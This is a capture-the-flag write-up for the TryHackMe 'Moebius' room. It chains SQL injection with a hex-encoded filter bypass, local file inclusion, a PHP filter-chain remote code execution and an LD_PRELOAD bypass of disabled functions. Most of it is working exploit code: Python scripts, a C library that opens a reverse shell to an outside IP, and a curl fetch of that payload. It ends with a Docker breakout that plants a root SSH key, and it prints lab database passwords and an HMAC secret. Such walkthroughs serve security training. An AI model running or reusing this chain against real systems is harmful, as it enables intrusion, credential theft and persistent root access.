---
tags:
  - THM
  - Linux
  - Hard
  - SQLi
  - LFI
  - Scripting
  - RCE
  - Lib-HJ
  - Docker
  - Sudo
---
https://tryhackme.com/room/moebius/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.66.178.79 moebius.thm
```
# Enumeration

```console
$ nmap -p22,80 -sV -sC moebius.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Image Grid
|_http-server-header: Apache/2.4.62 (Debian)
```

The website just stores cat pictures and search filters can be applied at `/album.php` with the `short_tag` parameter. The Album ID is also shown in an HTML comment, for example at `/album.php?short_tag=fav` we get:

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Image Grid</title>
<link rel="stylesheet" href="/style.css"> <!-- Link to external CSS file -->
</head>
<body>

<!-- Short tag: fav - Album ID: 3-->
<div class="grid-container">
<div class="image-container">
<a href="/image.php?hash=80d711adecde3d606552aabad7aec97e861299d5f8b40af13ff8793a247d77e3&path=/var/www/images/cat13.jpg"><img src="/image.php?hash=80d711adecde3d606552aabad7aec97e861299d5f8b40af13ff8793a247d77e3&path=/var/www/images/cat13.jpg" alt="Image path: /var/www/images/cat13.jpg"></a>
</div>
<div class="image-container">
<a href="/image.php?hash=4f6a0a03691df1dc5ea204d8e144215d842590e86c9a23f80d1e788ff7b69c55&path=/var/www/images/cat14.webp"><img src="/image.php?hash=4f6a0a03691df1dc5ea204d8e144215d842590e86c9a23f80d1e788ff7b69c55&path=/var/www/images/cat14.webp" alt="Image path: /var/www/images/cat14.webp"></a>
</div>
<div class="image-container">
<a href="/image.php?hash=c572a088e53a9964d20b67835f92958f15bd151065eedc0219c876e3fc005769&path=/var/www/images/cat15.webp"><img src="/image.php?hash=c572a088e53a9964d20b67835f92958f15bd151065eedc0219c876e3fc005769&path=/var/www/images/cat15.webp" alt="Image path: /var/www/images/cat15.webp"></a>
</div>
<div class="image-container">
<a href="/image.php?hash=973a096701f0a3e1e148e48d10fb3a5bc255ac685ebab4f4383b0f134f6f7321&path=/var/www/images/cat16.webp"><img src="/image.php?hash=973a096701f0a3e1e148e48d10fb3a5bc255ac685ebab4f4383b0f134f6f7321&path=/var/www/images/cat16.webp" alt="Image path: /var/www/images/cat16.webp"></a>
</div>
</div>
</body>
</html>
```

As we can see, the `/image.php` endpoint needs the file parameters `path` and `hash` for including the file inside the page content.

The server is also vulnerable to SQL injection, found it by causing an error at `/album.php?short_tag='`:
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Image Grid</title>
<link rel="stylesheet" href="/style.css"> <!-- Link to external CSS file -->
</head>
<body>

Connection failed: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1</body>
</html>
```
# Exploitation

## SQL Injection

Some characters such as `;` or `/` are being filtered. Output for `/album.php?short_tag=;`:
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Image Grid</title>
<link rel="stylesheet" href="/style.css"> <!-- Link to external CSS file -->
</head>
<body>

Hacking attempt
```

Listed databases using `sqlmap`:
```console
$ sqlmap --batch -u 'http://moebius.thm/album.php?short_tag=FUZZ' -p short_tag --dbs
...
available databases [2]:                                                                                                                       
[*] information_schema
[*] web
...
```

Dumped all the information from `web` database:
```console
$ sqlmap --batch -u 'http://moebius.thm/album.php?short_tag=FUZZ' -p short_tag -D web --dump-all
...
Database: web
Table: images
[16 entries]
+----------------------------+
| path                       |
+----------------------------+
| /var/www/images/cat1.jpg   |
| /var/www/images/cat10.webp |
| /var/www/images/cat11.webp |
| /var/www/images/cat12.webp |
| /var/www/images/cat13.jpg  |
| /var/www/images/cat14.webp |
| /var/www/images/cat15.webp |
| /var/www/images/cat16.webp |
| /var/www/images/cat2.jpg   |
| /var/www/images/cat3.jpg   |
| /var/www/images/cat4.jpg   |
| /var/www/images/cat5.avif  |
| /var/www/images/cat6.avif  |
| /var/www/images/cat7.png   |
| /var/www/images/cat8.webp  |
| /var/www/images/cat9.webp  |
+----------------------------+
...
Database: web
Table: albums
[3 entries]
+----------------+-----------+--------------------------+
| name           | short_tag | description              |
+----------------+-----------+--------------------------+
| Cute cats      | cute      | Cutest cats in the world |
| Favourite cats | fav       | My favourite ones        |
| Smart cats     | smart     | So smart...              |
+----------------+-----------+--------------------------+
...
```

Found the current SQL query:
```console
$ sqlmap --batch -u 'http://moebius.thm/album.php?short_tag=FUZZ' -p short_tag -D web --statements
...
SQL statements [1]:
[*] SELECT id from albums where short_tag = 'FUZZ' AND EXTRACTVALUE(2699,CONCAT(0x5c,0x71716b7071,(SELECT MID((IFNULL(CAST(INFO AS CHAR),0x20)),127,18) FROM INFORMATION_SCHEMA.PROCESSLIST),0x7176716a71))-- kBzc'
...
```

Did not find any file hashes in any database. So, when visiting `/album.php`, the application is likely working like this:
1. Extracts the album ID with `SELECT id FROM albums WHERE short_tag = 'FUZZ'`.
2. Extracts the file paths inside the album ID with `SELECT * FROM images WHERE id = FUZZ`. This second query could be least sanitized than the first one.
3. For each file path, calculates the file hash and includes them via `/image.php` with `hash` and `path` parameters.

To test this workflow, injected content in the second query by testing `/album.php?short_tag=NONEXISTENT' UNION SELECT 66-- -`:
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Image Grid</title>
<link rel="stylesheet" href="/style.css"> <!-- Link to external CSS file -->
</head>
<body>

<!-- Short tag: NONEXISTENT' UNION SELECT 0-- - - Album ID: 66-->
<div class="grid-container">
</div>
</body>
</html>
```

Found the number of columns in the second query by injecting `NONEXISTENT' UNION SELECT "0 UNION SELECT 1,2,3"-- -`. The third column controls the file path:
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Image Grid</title>
<link rel="stylesheet" href="/style.css"> <!-- Link to external CSS file -->
</head>
<body>

<!-- Short tag: NONEXISTENT' UNION SELECT "0 UNION SELECT 1,2,3"-- - - Album ID: 0 UNION SELECT 1,2,3-->
<div class="grid-container">
<div class="image-container">
<a href="/image.php?hash=bb5f3d653f3782dfc854ecdc95d2d1b24ae21516da21a20d0e3dc270c8636fba&path=3"><img src="/image.php?hash=bb5f3d653f3782dfc854ecdc95d2d1b24ae21516da21a20d0e3dc270c8636fba&path=3" alt="Image path: 3"></a>
</div>
</div>
</body>
</html>
```

Got the hash for `/etc/passwd` file by injecting `NONEXISTENT' UNION SELECT "0 UNION SELECT 1,2,0x2f6574632f706173737764"-- -`. Note that we hex encoded the file to bypass the `/` character filtering:
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Image Grid</title>
<link rel="stylesheet" href="/style.css"> <!-- Link to external CSS file -->
</head>
<body>

<!-- Short tag: NONEXISTENT' UNION SELECT "0 UNION SELECT 1,2,0x2f6574632f706173737764"-- - - Album ID: 0 UNION SELECT 1,2,0x2f6574632f706173737764-->
<div class="grid-container">
<div class="image-container">
<a href="/image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd"><img src="/image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd" alt="Image path: /etc/passwd"></a>
</div>
</div>
</body>
</html>
```

The file inclusion now works:
```console
$ curl -s 'http://moebius.thm/image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd'

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

## File Inclusion

### System Files

Created `lfi.py` Python script to enumerate internal system files:
```python
import re
import requests
import sys
from base64 import b64decode
from urllib.parse import quote

# SELECT * FROM images WHERE id=FUZZ
file = "php://filter/convert.base64-encode/resource=" + sys.argv[1]
file_hex = "0x" + file.encode().hex()
payload = f"0 UNION SELECT 1,2,{file_hex}-- -"

# SELECT id FROM albums WHERE short_tag = 'FUZZ'
payload = """NONEXISTENT' UNION SELECT "{}"-- -""".format(payload)

# Get file hash
r = requests.get("http://moebius.thm/album.php?short_tag=" + quote(payload))
file_hash = re.search(r"hash=.*?\&", r.text).group(0)

# Get file contents
r = requests.get(f"http://moebius.thm/image.php?{file_hash}path={file}")
file_content = b64decode(r.text).decode()

print(file_content)
```

Got file with `python3 lfi.py '/var/www/html/image.php'`:
```php
<?php

include('dbconfig.php');


    // Create a new PDO instance
    
    // Set PDO error mode to exception
    
    // Get the image ID from the query string
    
    // Fetch image path from the database based on the ID
    
    // Fetch image path
    $image_path = $_GET['path'];
    $hash= $_GET['hash'];

    $computed_hash=hash_hmac('sha256', $image_path, $SECRET_KEY);



    
    if ($image_path && $computed_hash === $hash) {
        // Get the MIME type of the image
        $image_info = @getimagesize($image_path);
        if ($image_info && isset($image_info['mime'])) {
            $mime_type = $image_info['mime'];
            // Set the appropriate content type header
            header("Content-type: $mime_type");
            
            // Output the image data
            include($image_path);
        } else {
            header("Content-type: application/octet-stream");
            include($image_path);
        }
    } else {
        echo "Image not found";
    }


?>
```

Got file with `python3 lfi.py '/var/www/html/album.php'`
```php
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Image Grid</title>
<link rel="stylesheet" href="/style.css"> <!-- Link to external CSS file -->
</head>
<body>

<?php

include('dbconfig.php');

try {
    // Create a new PDO instance
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    
    // Set PDO error mode to exception
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    if (preg_match('/[\/;]/', $_GET['short_tag'])) {
        // If it does, terminate with an error message
        die("Hacking attempt");
    }

    $album_id = "SELECT id from albums where short_tag = '" . $_GET['short_tag'] . "'";
    $result_album = $conn->prepare($album_id);
    $result_album->execute();
     
    $r=$result_album->fetch();
    $id=$r['id'];
    
     
    // Fetch image IDs from the database
    $sql_ids = "SELECT * FROM images where album_id=" . $id;
    $stmt_path= $conn->prepare($sql_ids);
    $stmt_path->execute();
    
    // Display the album id
    echo "<!-- Short tag: " . $_GET['short_tag'] . " - Album ID: " . $id . "-->\n";
    // Display images in a grid
    echo '<div class="grid-container">' . "\n";
    foreach ($stmt_path as $row) {
        // Get the image ID
        $path = $row["path"];
        $hash = hash_hmac('sha256', $path, $SECRET_KEY);

        // Create link to image.php with image ID
        echo '<div class="image-container">' . "\n";
        echo '<a href="/image.php?hash='. $hash . '&path=' . $path . '">';
        echo '<img src="/image.php?hash='. $hash . '&path=' . $path . '" alt="Image path: ' . $path . '">';
        echo "</a>\n";
        echo "</div>\n";;
    }
    echo "</div>\n";
} catch(PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}

// Close the connection
$conn = null;

?>
</body>
</html>
```

Got file with `python3 lfi.py '/var/www/html/dbconfig.php'`
```php
<?php
// Database connection settings
$servername = "db";
$username = "web";
$password = "TAJnF6YuIot83X3g";
$dbname = "web";


$SECRET_KEY='an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW';
?>
```

From what we can see, the required hash type at `/image.php` is an **HMAC SHA-256 hash** which uses a secret key. So, we will:
1. Generate a custom PHP filter chain with malicious PHP code.
2. Calculate the **HMAC SHA-256 hash** for the file path.
3. Display and execute the malicious PHP code via `/image.php` to achieve RCE.

### PHP Filter Chain

Modified the [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) script for a custom `php_chain.py`:
```python
#!/usr/bin/env python3

import argparse
import base64


CONVERSIONS = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': ''
}


def generate_filter_chain(chain: str):
    chain = chain.encode('utf-8')
    base64_chain = base64.b64encode(chain).decode('utf-8').replace('=', '')

    # Generate some garbage base64
    filters = "convert.iconv.UTF8.CSISO2022KR|"
    filters += "convert.base64-encode|"
    filters += "convert.iconv.UTF8.UTF7|"

    for c in base64_chain[::-1]:
        filters += CONVERSIONS[c] + "|"
        # Decode and encode again to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # Get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

    filters += "convert.base64-decode"
    return filters


def main():
    parser = argparse.ArgumentParser(description="PHP filter chain generator.")
    parser.add_argument("--chain", default="<?php phpinfo(); ?>", help="PHP code to convert. Default is '%(default)s'")
    parser.add_argument("--file", default="php://temp", help="File path to apply transformation. Default is '%(default)s'")
    args = parser.parse_args()

    php_code = ' ' + args.chain + ' ' # Padding is recommended
    file_to_use = args.file # No need to guess a valid filename anymore
    
    payload = f"php://filter/{generate_filter_chain(php_code)}/resource={file_to_use}"
    print(payload)

if __name__ == '__main__':
    main()
```

Created Python script `hash_calc.py` to generate a **HMAC SHA-256 hash** of some content:
```python
import hashlib
import hmac
import sys

key = b"an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW"
path = sys.argv[1].encode()

h = hmac.new(key, path, hashlib.sha256).hexdigest()
print(h)
```

Created Python script `php_rce.py` to get RCE by combining previous scripts:
```python
import requests
import subprocess

php_code = "<?php phpinfo(); ?>"
file_path = subprocess.check_output(["python3", "php_chain.py", "--chain", php_code]).decode().strip()
file_hash = subprocess.check_output(["python3", "hash_calc.py", file_path]).decode().strip()

params = {
    "path": file_path,
    "hash": file_hash,
}

r = requests.get("http://moebius.thm/image.php", params=params, timeout=3)
print(r.text)
```

Found that the next PHP functions are disabled by running `python3 php_rce.py`:
```text
exec, system, popen, proc_open, proc_nice, shell_exec, passthru, dl, pcntl_alarm, pcntl_async_signals, pcntl_errno, pcntl_exec, pcntl_fork, pcntl_get_last_error, pcntl_getpriority, pcntl_rfork, pcntl_setpriority, pcntl_signal_dispatch, pcntl_signal_get_handler, pcntl_signal, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_unshare, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig
```

### RCE LD_PRELOAD Bypass

Even though functions like `system()` or `shell_exec()` are being blocked, the `eval()` and `mail()` functions are not, so we are gonna load a custom library. First, created `shell.c`:
```c
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
    unsetenv("LD_PRELOAD");
    system("bash -c \"bash -i >& /dev/tcp/192.168.150.216/443 0>&1\"");
    return 1;
}
```

Now, we compile it and host it via Python server:
```console
$ gcc -fPIC -shared -nostartfiles -o shell.so shell.c

$ python3 -m http.server 8000
```

We modify the `php_rce.py` script to download the malicious `shell.so` and load it:
```python
import requests
import subprocess

php_code = "<?php eval($_GET[0]); ?>"
file_path = subprocess.check_output(["python3", "php_chain.py", "--chain", php_code]).decode().strip()
file_hash = subprocess.check_output(["python3", "hash_calc.py", file_path]).decode().strip()

php_exec = """
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://192.168.150.216:8000/shell.so");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
file_put_contents("/tmp/shell.so", curl_exec($ch));
curl_close($ch);

putenv('LD_PRELOAD=/tmp/shell.so');
mail('a','a','a','a');
"""

params = {
    "path": file_path,
    "hash": file_hash,
    "0": php_exec
}

r = requests.get("http://moebius.thm/image.php", params=params, timeout=3)
print(r.text)
```

Wait for connections:
```console
$ nc -lvnp 443
```

Get reverse shell connection:
```console
$ python3 php_rce.py
```

# Post-Exploitation

## Docker Breakout
We are in a Docker container as **www-data** user:
```console
$ hostname
bb28d5969dd5
```

We can execute any command as using `sudo`, so we become **root**:
```console
$ sudo -l
Matching Defaults entries for www-data on bb28d5969dd5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on bb28d5969dd5:
    (ALL : ALL) ALL
    (ALL : ALL) NOPASSWD: ALL

$ sudo su

# whoami
root
```

We mount the host file system:
```console
# lsblk
NAME        MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
loop0         7:0    0 63.9M  1 loop 
loop1         7:1    0   87M  1 loop 
loop2         7:2    0 38.8M  1 loop 
nvme0n1     259:0    0   40G  0 disk 
`-nvme0n1p1 259:1    0   40G  0 part /etc/hosts
                                     /etc/hostname
                                     /etc/resolv.conf
nvme1n1     259:2    0    1G  0 disk 
nvme2n1     259:3    0    1G  0 disk 

# mount /dev/nvme0n1p1 /mnt

# ls /mnt
bin   dev  home  lib32	libx32	   media  opt	root  sbin  srv  tmp  vagrant
boot  etc  lib	lib64	lost+found  mnt    proc  run   snap  sys  usr  var
```

In our machine, we generate SSH keys and share them with a Python server:
```console
$ ssh-keygen -t rsa -f root
...

$ python3 -m http.server 8000
```

We authorize our public key to log in as **root** via SSH:
```console
# curl -s -o /mnt/root/.ssh/authorized_keys 'http://192.168.150.216:8000/root.pub'
```

We log in via SSH and get the **user flag**:
```console
$ ssh -i root root@moebius.thm
...

# cat /root/user.txt
```

## Root Flag

There are two Docker containers running. Also, found some SQL credentials:
```console
# cat /root/challenge/docker-compose.yml
version: '3'

services:
  web:
    platform: linux/amd64
    build: ./web
    ports:
      - "80:80"
    restart: always
    privileged: true
  db:
    image: mariadb:10.11.11-jammy
    volumes:
      - "./db:/docker-entrypoint-initdb.d:ro"
    env_file:
      - ./db/db.env
    restart: always

# cat /root/challenge/db/db.env 
MYSQL_PASSWORD=TAJnF6YuIot83X3g
MYSQL_DATABASE=web
MYSQL_USER=web
MYSQL_ROOT_PASSWORD=gG4i8NFNkcHBwUpd

# docker ps
CONTAINER ID   IMAGE                    COMMAND                  CREATED         STATUS             PORTS                                 NAMES
89366d62e05c   mariadb:10.11.11-jammy   "docker-entrypoint.s…"   13 months ago   Up About an hour   3306/tcp                              challenge-db-1
bb28d5969dd5   challenge-web            "docker-php-entrypoi…"   13 months ago   Up About an hour   0.0.0.0:80->80/tcp, [::]:80->80/tcp   challenge-web-1
```

Connected to the `db` container and found the **root flag** in the MySQL database:
```console
# docker exec -it 89366d62e05c /bin/bash

# mysql -D web -u root -p
Enter password:
...

MariaDB [web]> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| secret             |
| sys                |
| web                |
+--------------------+

MariaDB [web]> USE secret;
...

MariaDB [secret]> SHOW tables;
+------------------+
| Tables_in_secret |
+------------------+
| secrets          |
+------------------+

MariaDB [secret]> SELECT * FROM secrets;
+---------------------------------------+
| flag                                  |
+---------------------------------------+
| THM{REDACTED}                         |
+---------------------------------------+
```

